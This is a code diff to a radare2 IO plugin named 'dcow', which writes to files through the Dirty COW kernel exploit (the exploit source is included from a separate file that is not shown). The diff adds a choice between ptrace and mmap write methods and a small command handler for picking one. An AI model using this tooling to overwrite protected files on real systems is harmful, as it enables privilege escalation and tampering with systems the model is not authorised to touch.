@@ -6,9 +6,7 @@
 
 #include "exploit.c"
 
-
 RIOPlugin r_io_plugin_dcow;
-
 
 typedef struct r_io_mmo_t {
 	char *filename;
@@ -19,6 +17,7 @@ typedef struct r_io_mmo_t {
 	ut8 modified;
 	RBuffer *buf;
 	RIO * io_backref;
+	bool force_ptrace;
 } RIOdcowFileObj;
 
 static ut64 r_io_dcow_seek(RIO *io, RIOdcowFileObj *mmo, ut64 offset, int whence) {
@@ -114,7 +113,7 @@ static int __write(RIO *io, RIODesc *fd, const ut8 *buf, int len) {
 	int i;
 	const int bs = 1024; // use pagesize here
 	const char *file = mmo->filename;
-	if (!strcmp (file, "self")) {
+	if (mmo->force_ptrace || !strcmp (file, "self")) {
 		file = NULL;
 	}
 
@@ -145,6 +144,23 @@ static int __close(RIODesc *fd) {
 	return 0;
 }
 
+static int __system(RIO *io, RIODesc *fd, const char *command) {
+	if (!fd || !fd->data || !command) {
+		return -1;
+	}
+	ut64 off = io->off;
+	RIOdcowFileObj *mmo = fd->data;
+	if (!strcmp (command, "?")) {
+		eprintf ("Dirtycow IO commands:\n");
+		eprintf ("=!ptrace\n");
+		eprintf ("=!mmap\n");
+	} else if (!strcmp (command, "ptrace")) {
+		mmo->force_ptrace = true;
+	} else if (!strcmp (command, "mmap")) {
+		mmo->force_ptrace = false;
+	}
+}
+
 RIOPlugin r_io_plugin_dcow = {
 	.name = "dcow",
 	.desc = "dirty cow baked IO for r2 dcow://[path]",
@@ -155,6 +171,7 @@ RIOPlugin r_io_plugin_dcow = {
 	.check = __plugin_open,
 	.lseek = __lseek,
 	.write = __write,
+	.system = __system,
 };
 
 #ifndef CORELIB
